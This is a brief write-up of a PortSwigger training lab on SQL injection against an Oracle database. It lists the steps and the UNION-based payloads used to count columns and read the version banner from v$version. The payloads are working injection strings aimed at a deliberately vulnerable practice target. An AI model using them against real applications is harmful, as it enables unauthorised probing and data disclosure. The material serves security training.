**Lab:** SQL injection to find Oracle database version
**Vulnerability:** SQL injection revealing database version
**Vulnerable Parameter:** category (GET request)
**Impact:** Information disclosure (database version exposure)
**Technique:** UNION attack with database-specific queries
**URL:** https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle

## Steps:
1. Find category parameter
2. Open Burp Suite and send request to Repeater
3. Test with `'` → Internal Server Error
4. Find column count: `' ORDER BY 2--` works, `' ORDER BY 3--` fails (2 columns)
5. Oracle requires FROM clause: `' UNION SELECT NULL,NULL FROM dual--`
6. Test string column: `' UNION SELECT 'a',NULL FROM dual--`
7. Get version: `' UNION SELECT NULL,banner FROM v$version--`
8. Lab solved

## Payload:

' UNION SELECT NULL,banner FROM v$version--


## Notes:
- Oracle requires `FROM dual` in SELECT statements (unlike MySQL/PostgreSQL)
- Must identify which column accepts string data for version output
- Different databases have different version queries
- Used PortSwigger's SQL injection cheat sheet for reference
